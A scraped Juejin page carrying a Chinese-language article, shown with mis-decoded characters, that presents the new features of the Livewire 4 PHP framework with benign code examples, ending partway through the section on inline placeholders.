content="åç«¯,PHP"/> <meta itemprop="datePublished" content="2026-01-14T23:32:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Livewire4 æ­£å¼å‘å¸ƒï¼PHP ä¹Ÿå¯ä»¥æ— éœ€å†™ä¸€è¡Œ Javascript ä»£ç å°±èƒ½å®ç° Vue çš„åŠŸèƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T23:32:45.000Z" title="Wed Jan 14 2026 23:32:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Livewire4 æ­£å¼å‘å¸ƒï¼PHP ä¹Ÿå¯ä»¥æ— éœ€å†™ä¸€è¡Œ Javascript ä»£ç å°±èƒ½å®ç° Vue çš„åŠŸèƒ½</h2>
<p>Livewire 4 æ­£å¼å‘å¸ƒï¼Œè¿™æ˜¯è¿„ä»Šä¸ºæ­¢æœ€å¤§çš„ä¸€æ¬¡ç‰ˆæœ¬æ›´æ–°ã€‚</p>
<p>è¿™æ¬¡æ›´æ–°çš„é‡ç‚¹ä¸æ˜¯å¢åŠ å¤æ‚åº¦ï¼Œè€Œæ˜¯æ›´å¥½çš„é»˜è®¤é…ç½®ã€æ›´å°‘çš„æ‘©æ“¦ã€æ›´å¼ºå¤§çš„å·¥å…·ã€‚å›¢é˜ŸèŠ±äº†å‡ ä¸ªæœˆæ—¶é—´é‡æ–°æ€è€ƒ Livewire ç»„ä»¶åº”è¯¥æ˜¯ä»€ä¹ˆæ ·å­ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Flivewire-4-everything-new" target="_blank" title="https://catchadmin.com/post/2026-01/livewire-4-everything-new" ref="nofollow noopener noreferrer">åŸæ–‡ Livewire4 æ­£å¼å‘å¸ƒï¼PHP ä¹Ÿå¯ä»¥æ— éœ€å†™ä¸€è¡Œ Javascript ä»£ç å°±èƒ½å®ç° Vue çš„åŠŸèƒ½</a></p>
<h3 data-id="heading-1">åŸºäºè§†å›¾çš„ç»„ä»¶</h3>
<p>Livewire 4 æœ€ç›´è§‚çš„å˜åŒ–æ˜¯ç»„ä»¶çš„å†™æ³•ã€‚ä»¥å‰éœ€è¦åœ¨ PHP ç±»å’Œ Blade æ–‡ä»¶ä¹‹é—´æ¥å›åˆ‡æ¢ï¼Œç°åœ¨å¯ä»¥æŠŠæ‰€æœ‰ä¸œè¥¿æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// resources/views/components/âš¡counter.blade.php</span>
 
<span class="hljs-keyword">use</span> <span class="hljs-title">Livewire</span>\<span class="hljs-title">Component</span>;
 
<span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$count</span> = <span class="hljs-number">0</span>;
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increment</span>(<span class="hljs-params"/>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;count++;
    }
};
<span class="hljs-meta">?&gt;</span>
 
&lt;div&gt;
    &lt;h1&gt;{{ <span class="hljs-variable">$count</span> }}&lt;/h1&gt;
    &lt;button wire:click=<span class="hljs-string">"increment"</span>&gt;+&lt;/button&gt;
&lt;/div&gt;
 
&lt;style&gt;
    <span class="hljs-comment">/* Scoped CSS... */</span>
&lt;/style&gt;
 
&lt;script&gt;
    <span class="hljs-comment">/* Component JavaScript... */</span>
&lt;/script&gt;
</code></pre>
<p>è¿è¡Œ <code>php artisan make:livewire</code> æ—¶é»˜è®¤å°±æ˜¯è¿™ç§æ ¼å¼ã€‚æ–‡ä»¶åé‡Œçš„é—ªç”µç¬¦å·è®© Livewire ç»„ä»¶åœ¨æ–‡ä»¶æ ‘é‡Œä¸€çœ¼å°±èƒ½è®¤å‡ºæ¥ï¼Œä¸ä¼šå’Œæ™®é€š Blade ç»„ä»¶æ··æ·†ã€‚ï¼ˆä¸å–œæ¬¢ emoji çš„è¯å¯ä»¥å…³æ‰ã€‚ï¼‰</p>
<p>å¯¹äºå¤§å‹ç»„ä»¶ï¼Œè¿˜æœ‰ä¸€ç§å¤šæ–‡ä»¶æ ¼å¼ï¼ŒæŠŠç›¸å…³æ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼š</p>
<pre><code class="hljs language-text" lang="text">âš¡counter/
â”œâ”€â”€ counter.php
â”œâ”€â”€ counter.blade.php
â”œâ”€â”€ counter.css          (å¯é€‰)
â”œâ”€â”€ counter.js           (å¯é€‰)
â””â”€â”€ counter.test.php     (å¯é€‰)
</code></pre>
<p>ç”¨ <code>--mfc</code> å‚æ•°åˆ›å»ºå¤šæ–‡ä»¶ç»„ä»¶ï¼Œéšæ—¶å¯ä»¥ç”¨ <code>php artisan livewire:convert</code> åœ¨ä¸¤ç§æ ¼å¼ä¹‹é—´è½¬æ¢ã€‚</p>
<h3 data-id="heading-2">è·¯ç”±</h3>
<p>ç»„ä»¶å¼•ç”¨æ–¹å¼ç»Ÿä¸€äº†ã€‚Livewire 4 å¼•å…¥äº† <code>Route::livewire()</code>ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// ä¹‹å‰ (v3) - ä»ç„¶æ”¯æŒ</span>
<span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'/posts/create'</span>, <span class="hljs-title class_">CreatePost</span>::<span class="hljs-variable language_">class</span>);
 
<span class="hljs-comment">// ç°åœ¨ (v4)</span>
<span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">livewire</span>(<span class="hljs-string">'/posts/create'</span>, <span class="hljs-string">'pages::post.create'</span>);
</code></pre>
<p>æ–°è¯­æ³•ç”¨åç§°è€Œä¸æ˜¯ç±»æ¥å¼•ç”¨ç»„ä»¶ï¼Œå’Œåº”ç”¨å…¶ä»–åœ°æ–¹æ¸²æŸ“ç»„ä»¶çš„æ–¹å¼ä¸€è‡´ã€‚</p>
<h3 data-id="heading-3">å‘½åç©ºé—´</h3>
<p>Livewire ç°åœ¨å¯¹åº”ç”¨ç»“æ„æœ‰äº†è‡ªå·±çš„çº¦å®šã€‚é»˜è®¤æä¾›ä¸¤ä¸ªå‘½åç©ºé—´ï¼š<code>pages::</code> ç”¨äºé¡µé¢ç»„ä»¶ï¼Œ<code>layouts::</code> ç”¨äºå¸ƒå±€â€”â€”å…¶ä»–ç»„ä»¶å’Œ Blade ç»„ä»¶ä¸€èµ·æ”¾åœ¨ <code>resources/views/components</code> ç›®å½•ä¸‹ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">livewire</span>(<span class="hljs-string">'/dashboard'</span>, <span class="hljs-string">'pages::dashboard'</span>);
</code></pre>
<p>å¯¹äºæ¨¡å—åŒ–åº”ç”¨ï¼Œå¯ä»¥æ³¨å†Œè‡ªå®šä¹‰å‘½åç©ºé—´ã€‚æŠŠç®¡ç†åå°ç»„ä»¶æ”¾åœ¨ <code>admin::</code> ä¸‹ï¼Œè®¡è´¹ç›¸å…³çš„æ”¾åœ¨ <code>billing::</code> ä¸‹ï¼ŒæŒ‰ä½ çš„æ¶æ„æ¥ç»„ç»‡ã€‚</p>
<h3 data-id="heading-4">è„šæœ¬å’Œæ ·å¼</h3>
<p>ç»„ä»¶çš„ JavaScript å’Œ CSS ç°åœ¨å¯ä»¥å’Œç»„ä»¶æ”¾åœ¨ä¸€èµ·ã€‚ç›´æ¥åœ¨æ¨¡æ¿é‡ŒåŠ  <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code> æ ‡ç­¾ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"title"</span>&gt;</span>{{ $count }}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">wire:click</span>=<span class="hljs-string">"$js.celebrate"</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
 
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.title</span> {
    <span class="hljs-attribute">color</span>: blue;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
 
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$js</span>.<span class="hljs-property">celebrate</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">confetti</span>()
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æ ·å¼è‡ªåŠ¨é™å®šåœ¨ç»„ä»¶èŒƒå›´å†…â€”â€”ä½ çš„ <code>.title</code> ç±»ä¸ä¼šå½±å“é¡µé¢å…¶ä»–éƒ¨åˆ†ã€‚éœ€è¦å…¨å±€æ ·å¼çš„è¯ï¼ŒåŠ ä¸Š <code>global</code> å±æ€§ï¼š<code>&lt;style global&gt;</code>ã€‚</p>
<p>è„šæœ¬é‡Œå¯ä»¥ç”¨ <code>this</code> è®¿é—®ç»„ä»¶ä¸Šä¸‹æ–‡â€”â€”ç›¸å½“äºä½ å¯èƒ½ç”¨è¿‡çš„ <code>$wire</code> çš„åˆ«åã€‚</p>
<p>ä¸¤è€…éƒ½ä¼šä½œä¸ºåŸç”Ÿ <code>.js</code>/<code>.css</code> æ–‡ä»¶å‘é€åˆ°æµè§ˆå™¨ï¼Œè‡ªåŠ¨ç¼“å­˜ä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚</p>
<h3 data-id="heading-5">Islands</h3>
<p>Islands æ˜¯ Livewire 4 çš„é‡å¤´æˆã€‚å®ƒå¯ä»¥åœ¨ç»„ä»¶å†…åˆ›å»ºç‹¬ç«‹æ›´æ–°çš„éš”ç¦»åŒºåŸŸï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    @island
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            Revenue: {{ $this-&gt;revenue }}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">wire:click</span>=<span class="hljs-string">"$refresh"</span>&gt;</span>Refresh<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    @endisland
 
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- è¿™éƒ¨åˆ†åœ¨ island æ›´æ–°æ—¶ä¸ä¼šé‡æ–°æ¸²æŸ“ --&gt;</span>
        Other content...
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>ç‚¹å‡»"Refresh"æ—¶ï¼Œåªæœ‰ island éƒ¨åˆ†é‡æ–°æ¸²æŸ“ï¼Œå…¶ä»–å†…å®¹ä¿æŒä¸å˜ã€‚ä»¥å‰è¦å®ç°ç±»ä¼¼çš„éš”ç¦»æ•ˆæœï¼Œéœ€è¦æŠŠè¿™éƒ¨åˆ†æå–æˆå•ç‹¬çš„å­ç»„ä»¶ï¼Œè¿˜è¦å¤„ç† props å’Œ events çš„ä¼ é€’ã€‚</p>
<p>æ€§èƒ½æå‡ä¸åªæ˜¯ DOM æ›´æ–°å±‚é¢ã€‚å½“ islands å’Œè®¡ç®—å±æ€§é…åˆä½¿ç”¨æ—¶ï¼Œåªæœ‰è¯¥ island éœ€è¦çš„æ•°æ®æ‰ä¼šè¢«è·å–ã€‚å¦‚æœç»„ä»¶æœ‰ä¸‰ä¸ª islandï¼Œå„è‡ªå¼•ç”¨ä¸åŒçš„è®¡ç®—å±æ€§ï¼Œåˆ·æ–°ä¸€ä¸ª island åªä¼šæ‰§è¡Œé‚£ä¸ª island çš„æŸ¥è¯¢ã€‚ä»æ•°æ®åº“åˆ°æ¸²æŸ“ HTMLï¼Œæ•´ä¸ªé“¾è·¯çš„å¼€é”€éƒ½è¢«éš”ç¦»äº†ã€‚</p>
<p>Islands æ”¯æŒæ‡’åŠ è½½ï¼ˆ<code>lazy: true</code>ï¼‰ã€å‘½åä»¥ä¾¿è·¨ç»„ä»¶å®šä½ï¼ˆ<code>name: 'revenue'</code>ï¼‰ï¼Œä»¥åŠè¿½åŠ å†…å®¹ç”¨äºæ— é™æ»šåŠ¨ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">wire:click</span>=<span class="hljs-string">"loadMore"</span> <span class="hljs-attr">wire:island.append</span>=<span class="hljs-string">"feed"</span>&gt;</span>
    Load more
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<h3 data-id="heading-6">æ’æ§½å’Œå±æ€§è½¬å‘</h3>
<p>å¦‚æœä½ ç”¨è¿‡ Blade ç»„ä»¶çš„æ’æ§½å’Œå±æ€§è½¬å‘ï¼Œè¿™é‡Œä¼šå¾ˆç†Ÿæ‚‰ã€‚</p>
<p>æ’æ§½è®©çˆ¶ç»„ä»¶å¯ä»¥å‘å­ç»„ä»¶æ³¨å…¥å†…å®¹ï¼ŒåŒæ—¶ä¿æŒå“åº”å¼ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">livewire:card</span> <span class="hljs-attr">:</span>$<span class="hljs-attr">post</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>{{ $post-&gt;title }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">wire:click</span>=<span class="hljs-string">"delete({{ $post-&gt;id }})"</span>&gt;</span>Delete<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">livewire:card</span>&gt;</span>
</code></pre>
<p>æ’æ§½å†…å®¹åœ¨çˆ¶ç»„ä»¶çš„ä¸Šä¸‹æ–‡ä¸­æ±‚å€¼ï¼Œæ‰€ä»¥ <code>wire:click="delete"</code> è°ƒç”¨çš„æ˜¯çˆ¶ç»„ä»¶çš„æ–¹æ³•ã€‚</p>
<p>å±æ€§è½¬å‘å¯ä»¥æŠŠ HTML å±æ€§ä¼ é€’ä¸‹å»ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">livewire:post.show</span> <span class="hljs-attr">:</span>$<span class="hljs-attr">post</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-4"</span> /&gt;</span>
 
<span class="hljs-comment">&lt;!-- post.show ç»„ä»¶å†…éƒ¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> {{ $<span class="hljs-attr">attributes</span> }}&gt;</span>
    ...
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">æ‹–æ‹½æ’åº</h3>
<p>å†…ç½®æ‹–æ‹½æ’åºï¼Œä¸éœ€è¦å¤–éƒ¨åº“ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">wire:sort</span>=<span class="hljs-string">"reorder"</span>&gt;</span>
    @foreach ($items as $item)
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">wire:key</span>=<span class="hljs-string">"{{ $item-&gt;id }}"</span> <span class="hljs-attr">wire:sort:item</span>=<span class="hljs-string">"{{ $item-&gt;id }}"</span>&gt;</span>
            {{ $item-&gt;title }}
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    @endforeach
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reorder</span>(<span class="hljs-params"><span class="hljs-variable">$item</span>, <span class="hljs-variable">$position</span></span>)
</span>{
    <span class="hljs-comment">// $item æ˜¯ IDï¼Œ$position æ˜¯æ–°çš„ç´¢å¼•</span>
}
</code></pre>
<p>åŠ¨ç”»æ•ˆæœè‡ªåŠ¨å¤„ç†ã€‚ç”¨ <code>wire:sort:handle</code> æ·»åŠ æ‹–æ‹½æ‰‹æŸ„ï¼Œç”¨ <code>wire:sort:ignore</code> é˜²æ­¢äº¤äº’å…ƒç´ è§¦å‘æ‹–æ‹½ï¼Œç”¨ <code>wire:sort:group</code> åœ¨å¤šä¸ªåˆ—è¡¨ä¹‹é—´æ‹–æ‹½ã€‚</p>
<h3 data-id="heading-8">å¹³æ»‘è¿‡æ¸¡</h3>
<p><code>wire:transition</code> æŒ‡ä»¤ä½¿ç”¨æµè§ˆå™¨çš„ View Transitions API æ·»åŠ ç¡¬ä»¶åŠ é€ŸåŠ¨ç”»ï¼š</p>
<pre><code class="hljs language-html" lang="html">@if ($showAlertMessage)
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">wire:transition</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ¶ˆæ¯å¹³æ»‘æ·¡å…¥æ·¡å‡º --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
@endif
</code></pre>
<p>å¯¹äºæ­¥éª¤å‘å¯¼æˆ–è½®æ’­è¿™ç§éœ€è¦æ–¹å‘æ„Ÿçš„åœºæ™¯ï¼Œå¯ä»¥æŒ‡å®šè¿‡æ¸¡ç±»å‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">#[Transition</span>(<span class="hljs-attr">type</span>: <span class="hljs-string">'forward'</span>)<span class="hljs-meta">]</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">next</span>(<span class="hljs-params"/>) </span>{ <span class="hljs-variable language_">$this</span>-&gt;step++; }
 
<span class="hljs-meta">#[Transition</span>(<span class="hljs-attr">type</span>: <span class="hljs-string">'backward'</span>)<span class="hljs-meta">]</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">previous</span>(<span class="hljs-params"/>) </span>{ <span class="hljs-variable language_">$this</span>-&gt;step--; }
</code></pre>
<p>ç„¶åç”¨ <code>::view-transition-old()</code> å’Œ <code>::view-transition-new()</code> ä¼ªå…ƒç´ ä¸ºæ¯ä¸ªæ–¹å‘è‡ªå®šä¹‰ CSS åŠ¨ç”»ã€‚</p>
<h3 data-id="heading-9">ä¹è§‚æ›´æ–°</h3>
<p>è®©ç•Œé¢å“åº”æ›´å³æ—¶ã€‚è¿™äº›æŒ‡ä»¤ä¼šç«‹å³æ›´æ–°é¡µé¢ï¼Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨å“åº”ã€‚</p>
<p><code>wire:show</code> ç”¨ CSS åˆ‡æ¢å¯è§æ€§ï¼ˆä¸ç§»é™¤ DOMï¼Œä¸å‘ç½‘ç»œè¯·æ±‚ï¼‰ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">wire:show</span>=<span class="hljs-string">"showModal"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ç«‹å³æ˜¾ç¤º/éšè— --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><code>wire:text</code> ç«‹å³æ›´æ–°æ–‡æœ¬å†…å®¹ï¼š</p>
<pre><code class="hljs language-html" lang="html">Likes: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">wire:text</span>=<span class="hljs-string">"likes"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
</code></pre>
<p><code>wire:bind</code> å“åº”å¼ç»‘å®šä»»æ„ HTML å±æ€§ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">wire:model</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">wire:bind:class</span>=<span class="hljs-string">"message.length &gt; 240 &amp;&amp; 'text-red-500'"</span>&gt;</span>
</code></pre>
<p><code>$dirty</code> è·Ÿè¸ªæœªä¿å­˜çš„æ›´æ”¹ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">wire:show</span>=<span class="hljs-string">"$dirty"</span>&gt;</span>You have unsaved changes<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">wire:show</span>=<span class="hljs-string">"$dirty('title')"</span>&gt;</span>Title modified<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">åŠ è½½çŠ¶æ€</h3>
<p>é™¤äº† v3 å·²æœ‰çš„ <code>wire:loading</code>ï¼ŒLivewire 4 ä¼šè‡ªåŠ¨ç»™è§¦å‘ç½‘ç»œè¯·æ±‚çš„å…ƒç´ æ·»åŠ  <code>data-loading</code> å±æ€§ã€‚</p>
<p>è¿™æ ·å¯ä»¥ç›´æ¥ç”¨ CSS è®¾ç½®åŠ è½½çŠ¶æ€æ ·å¼ï¼Œè¿˜èƒ½å®šä½å…„å¼Ÿã€çˆ¶çº§æˆ–å­å…ƒç´ ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">wire:click</span>=<span class="hljs-string">"save"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"data-loading:opacity-50"</span>&gt;</span>
    Save <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"not-in-data-loading:hidden"</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<h3 data-id="heading-11">å†…è”å ä½ç¬¦</h3>
<p>å¯¹äºæ‡’åŠ è½½ç»„ä»¶å’Œ islandsï¼Œ<code>@placeholder</code> æŒ‡ä»¤å¯ä»¥åœ¨å†…å®¹æ—è¾¹ç›´æ¥å®šä¹‰åŠ è½½çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-html" lang="html">@placeholder
